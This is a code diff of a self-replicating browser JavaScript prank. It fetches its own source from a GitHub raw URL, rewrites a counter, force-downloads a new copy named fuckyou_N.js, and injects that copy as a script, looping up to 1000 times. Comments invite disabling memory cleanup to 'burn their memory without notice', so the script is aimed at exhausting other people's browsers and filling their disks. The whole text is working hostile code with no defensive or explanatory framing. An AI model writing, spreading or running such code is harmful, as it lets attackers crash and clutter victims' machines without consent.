@@ -1,20 +1,29 @@
-// Scope insulation wrapper to make each generation independent
+
 (async function lobotomyScope() {
 
-    // Safely track the counter using a global window registry state
+
+    const MAX_LOBOTOMIES = 1000;
+
+
     window.lobotoCounterRegister = typeof window.lobotoCounterRegister !== 'undefined' ? window.lobotoCounterRegister : 0;
     const currentCounter = window.lobotoCounterRegister;
     const futureSelf = currentCounter + 1;
 
+
+    if (currentCounter >= MAX_LOBOTOMIES) {
+        console.log(`%c[Engine] Execution halted. Reached max limit of ${MAX_LOBOTOMIES} files.`, "color: #ff4757; font-weight: bold;");
+        return;
+    }
+
     let source;
 
-    // Check if a parent generation handed down the source text in memory
+
     if (window.lobotoSourceTextPayload) {
         source = window.lobotoSourceTextPayload;
     } else {
         try {
-            // Using your exact required raw content URL mapping for the baseline boot
-            const fetched = await fetch(`https://raw.githubusercontent.com/barrettma00-droid/fuckyou_0/refs/heads/main/fuckyou_0.js`);
+            // Using your exact raw content URL mapping for the baseline boot
+            const fetched = await fetch(`https://githubusercontent.com`);
             if (!fetched.ok) throw new Error("CORS or target file network mismatch.");
             source = await fetched.text();
         } catch (e) {
@@ -23,30 +32,28 @@
         }
     }
 
-    // Perform the precise string token manipulation for the subsequent generation download
-    // DO NOT change this exact formatting; the regex engine relies on this pattern matching!
+
     const brainSynapses = source.replace(
         `let lobotoCounter = ${currentCounter};`,
         `let lobotoCounter = ${futureSelf};`
     );
 
-    // Formulate the official File object structure
+
     const file = new File([brainSynapses], `fuckyou_${futureSelf}.js`, {
         type: "text/javascript",
     });
 
-    // Pass everything down the pipeline
+
     theSecondLobotomy(file, brainSynapses, futureSelf);
 
     async function theSecondLobotomy(capturedFile, mutatedText, nextId) {
         const capturedContent = await capturedFile.text();
-        console.log(`Generated: ${capturedFile.name}`);
-        console.log(capturedContent);
+        console.log(`Generated & Executing: ${capturedFile.name} (${nextId}/${MAX_LOBOTOMIES})`);
 
-        // Execute physical disk download
+        //Comment this if you to burn their memory without notice
         downloadFile(capturedFile);
 
-        // Push payload to the browser memory execution environment
+
         theFinalLobotomy(mutatedText, nextId);
     }
 
@@ -61,7 +68,7 @@
     }
 
     async function theFinalLobotomy(string, nextId) {
-        // Feed the updated source text and counter threshold straight into the global registries
+
         window.lobotoSourceTextPayload = string;
         window.lobotoCounterRegister = nextId;
 
@@ -72,7 +79,8 @@
         theNeedle.src = blobsPlace;
 
         theNeedle.onload = () => {
-            URL.revokeObjectURL(blobsPlace);
+            //Uncomment this if you want less suffering for your memory
+            //URL.revokeObjectURL(blobsPlace);
         };
 
         document.head.appendChild(theNeedle);
